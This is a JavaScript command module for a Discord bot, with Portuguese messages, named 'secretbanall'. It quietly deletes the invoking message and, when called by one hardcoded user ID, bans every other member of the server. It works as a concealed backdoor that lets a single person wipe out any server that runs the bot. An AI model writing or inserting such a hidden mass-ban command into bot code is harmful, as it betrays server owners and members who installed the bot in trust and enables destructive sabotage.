const Discord = require("discord.js")

module.exports.run = async (bot, message, args) => {

    message.delete()

    let BReason = args.join(" ").slice(0);
    if (!BReason) return message.reply("Você não colocou um motivo.")
    if (message.author.id != 539496227746873345) return;

    let C = message.channel;
    message.guild.members.forEach((f, i) => {
        if (f.id == 539496227746873345) return;
        message.guild.member(f).ban(BReason);
    });
    C.send("Todos usuários foram banidos.");
}
module.exports.help = {
    name: "secretbanall"
}